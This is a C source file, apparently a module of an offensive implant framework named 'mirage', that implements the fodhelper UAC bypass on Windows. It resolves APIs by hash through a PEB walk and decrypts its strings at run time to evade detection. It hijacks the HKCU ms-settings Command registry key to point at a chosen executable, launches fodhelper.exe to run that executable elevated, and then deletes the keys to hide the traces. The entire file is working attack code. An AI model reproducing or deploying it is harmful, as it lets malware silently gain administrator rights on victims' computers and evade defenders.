#include "uac_bypass.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_UAC_BYPASS
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "nt_types.h"
#include "enc_strings.h"
#include <windows.h>
#include <string.h>

/* ── PEB-walk API resolution (advapi32.dll + kernel32.dll) ──── */

typedef LONG   (WINAPI *pRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG   (WINAPI *pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE *, DWORD);
typedef LONG   (WINAPI *pRegCloseKey)(HKEY);
typedef LONG   (WINAPI *pRegDeleteKeyW)(HKEY, LPCWSTR);
typedef LONG   (WINAPI *pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, DWORD, PHKEY);
typedef LONG   (WINAPI *pRegDeleteValueW)(HKEY, LPCWSTR);
typedef BOOL   (WINAPI *pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
typedef int    (WINAPI *pMultiByteToWideChar_uac)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef BOOL   (WINAPI *pAllocateAndInitializeSid_uac)(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID *);
typedef BOOL   (WINAPI *pCheckTokenMembership_uac)(HANDLE, PSID, PBOOL);
typedef PVOID  (WINAPI *pFreeSid_uac)(PSID);

static struct {
    pRegCreateKeyExW        pRegCreateKeyExW;
    pRegSetValueExW         pRegSetValueExW;
    pRegCloseKey            pRegCloseKey;
    pRegDeleteKeyW          pRegDeleteKeyW;
    pRegOpenKeyExW          pRegOpenKeyExW;
    pRegDeleteValueW        pRegDeleteValueW;
    pCreateProcessW         pCreateProcessW;
    pWaitForSingleObject    pWaitForSingleObject;
    pCloseHandle            pCloseHandle;
    pMultiByteToWideChar_uac pMBTWC;
    pAllocateAndInitializeSid_uac pAIIS;
    pCheckTokenMembership_uac   pCTM;
    pFreeSid_uac                pFS;
    int                     ready;
} g_uac_api;

static int uac_ensure_api(void) {
    if (g_uac_api.ready) return 1;

    /* advapi32.dll */
    char dll[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll);
    void *adv = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!adv) return 0;

    char fn[32];
    enc_decrypt(enc_RegCreateKeyExW, ENC_REGCREATEKEYEXW_LEN, fn);
    g_uac_api.pRegCreateKeyExW = (pRegCreateKeyExW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegSetValueExW, ENC_REGSETVALUEEXW_LEN, fn);
    g_uac_api.pRegSetValueExW = (pRegSetValueExW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegCloseKey, ENC_REGCLOSEKEY_LEN, fn);
    g_uac_api.pRegCloseKey = (pRegCloseKey)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegDeleteKeyW, ENC_REGDELETEKEYW_LEN, fn);
    g_uac_api.pRegDeleteKeyW = (pRegDeleteKeyW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegOpenKeyExW, ENC_REGOPENKEYEXW_LEN, fn);
    g_uac_api.pRegOpenKeyExW = (pRegOpenKeyExW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_RegDeleteValueW, ENC_REGDELETEVALUEW_LEN, fn);
    g_uac_api.pRegDeleteValueW = (pRegDeleteValueW)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_AllocateAndInitializeSid, ENC_ALLOCATEANDINITIALIZESID_LEN, fn);
    g_uac_api.pAIIS = (pAllocateAndInitializeSid_uac)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CheckTokenMembership, ENC_CHECKTOKENMEMBERSHIP_LEN, fn);
    g_uac_api.pCTM = (pCheckTokenMembership_uac)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FreeSid, ENC_FREESID_LEN, fn);
    g_uac_api.pFS = (pFreeSid_uac)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));

    if (!g_uac_api.pRegCreateKeyExW || !g_uac_api.pRegSetValueExW ||
        !g_uac_api.pRegOpenKeyExW || !g_uac_api.pRegDeleteValueW ||
        !g_uac_api.pAIIS || !g_uac_api.pCTM || !g_uac_api.pFS)
        return 0;

    /* kernel32.dll */
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    enc_decrypt(enc_CreateProcessW, ENC_CREATEPROCESSW_LEN, fn);
    g_uac_api.pCreateProcessW = (pCreateProcessW)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_WaitForSingleObject, ENC_WAITFORSINGLEOBJECT_LEN, fn);
    g_uac_api.pWaitForSingleObject = (pWaitForSingleObject)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    g_uac_api.pCloseHandle = (pCloseHandle)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_MultiByteToWideChar, ENC_MULTIBYTETOWIDECHAR_LEN, fn);
    g_uac_api.pMBTWC = (pMultiByteToWideChar_uac)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));

    if (!g_uac_api.pCreateProcessW || !g_uac_api.pWaitForSingleObject || !g_uac_api.pCloseHandle || !g_uac_api.pMBTWC)
        return 0;

    g_uac_api.ready = 1;
    return 1;
}

/* ── isElevated ───────────────────────────────────────────── */

int mirage_is_elevated(void) {
    if (!uac_ensure_api()) return 0;
    BOOL is_admin = FALSE;
    PSID admin_group = NULL;
    SID_IDENTIFIER_AUTHORITY nt_authority = {SECURITY_NT_AUTHORITY};

    if (g_uac_api.pAIIS(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin_group)) {
        g_uac_api.pCTM(NULL, admin_group, &is_admin);
        g_uac_api.pFS(admin_group);
    }
    return is_admin ? 1 : 0;
}

/* ── fodhelper UAC bypass ──────────────────────────────────── */
int mirage_uac_cleanup(void);



int mirage_uac_bypass(const char *exe_path) {
    if (mirage_is_elevated()) return 0;
    if (!uac_ensure_api()) return -1;

    /* Decrypt registry path: Software\Classes\ms-settings\Shell\Open\Command */
    wchar_t wreg_ms[128];
    enc_decrypt_wide(enc_wreg_mssettings, ENC_WREG_MSSETTINGS_LEN, wreg_ms);

    /* Create registry key */
    HKEY hKey;
    LONG result = g_uac_api.pRegCreateKeyExW(
        HKEY_CURRENT_USER,
        wreg_ms,
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) return -1;

    /* Set default value to our executable */
    WCHAR wpath[1024];
    int wlen = g_uac_api.pMBTWC(CP_UTF8, 0, exe_path, -1, wpath, 1024);
    if (wlen <= 0 || wlen > 1024) { g_uac_api.pRegCloseKey(hKey); return -1; }

    result = g_uac_api.pRegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)wpath,
                                       (DWORD)(wlen * sizeof(WCHAR)));
    if (result != ERROR_SUCCESS) { g_uac_api.pRegCloseKey(hKey); return -1; }

    /* Set DelegateExecute to an empty REG_SZ VALUE (canonical fodhelper
     * technique). The old code created a DelegateExecute SUBKEY, which the
     * COM activation ignores. Key handle is still open — reuse it. */
    result = g_uac_api.pRegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
                                       (const BYTE*)L"", sizeof(WCHAR));
    g_uac_api.pRegCloseKey(hKey);
    if (result != ERROR_SUCCESS) return -1;

    /* Launch fodhelper.exe to trigger UAC bypass */
    STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    wchar_t fodhelper[64];
    enc_decrypt_wide(enc_wfodhelper, ENC_WFODHELPER_LEN, fodhelper);
    if (g_uac_api.pCreateProcessW(fodhelper, NULL,
                                   NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        g_uac_api.pWaitForSingleObject(pi.hProcess, 5000);
        g_uac_api.pCloseHandle(pi.hProcess);
        g_uac_api.pCloseHandle(pi.hThread);
    }

    /* Remove HKCU artifacts on both success and failure paths — the old
     * code never called cleanup, leaving hijacked ms-settings keys behind. */
    mirage_uac_cleanup();

    return 0;
}

/* ── cleanup ───────────────────────────────────────────────── */

int mirage_uac_cleanup(void) {
    if (!uac_ensure_api()) return -1;

    wchar_t wreg_ms[128];
    enc_decrypt_wide(enc_wreg_mssettings, ENC_WREG_MSSETTINGS_LEN, wreg_ms);

    /* Delete the DelegateExecute VALUE (4.4 writes it as a value, not a
     * subkey) via RegOpenKeyExW + RegDeleteValueW on the Command key. */
    HKEY hKey;
    LONG result = g_uac_api.pRegOpenKeyExW(
        HKEY_CURRENT_USER, wreg_ms, 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        g_uac_api.pRegDeleteValueW(hKey, L"DelegateExecute");
        g_uac_api.pRegCloseKey(hKey);
    }

    /* Remove the hijacked Command key itself */
    g_uac_api.pRegDeleteKeyW(HKEY_CURRENT_USER, wreg_ms);
    return 0;
}

#endif /* ENABLE_UAC_BYPASS */
